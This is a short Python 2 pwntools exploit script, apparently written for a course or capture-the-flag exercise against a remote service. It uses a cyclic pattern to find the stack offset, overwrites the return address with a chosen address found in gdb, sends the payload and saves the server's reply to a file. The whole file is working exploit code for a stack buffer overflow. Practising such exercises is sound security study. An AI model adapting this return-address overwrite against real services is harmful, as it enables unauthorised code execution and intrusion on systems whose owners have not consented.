#!/usr/bin/python2
import pwn
from struct import *

desired_ret = 0x401162 #We know that desassembling it with gdb
c = pwn.remote('shepherd.ii.uib.no', 9002)


offset = pwn.cyclic_find('kaaa') #This is the substring in my pattern in the top
#of the stack as we saw in gdb

buf = pwn.cyclic(offset)

buf += pwn.p64(desired_ret)

c.sendline(buf) #we sent the payload

f = open("out_2.txt", "w") #file where the results are going to save

f.write(c.recvall()) #receiving the results and writting them in out.txt.

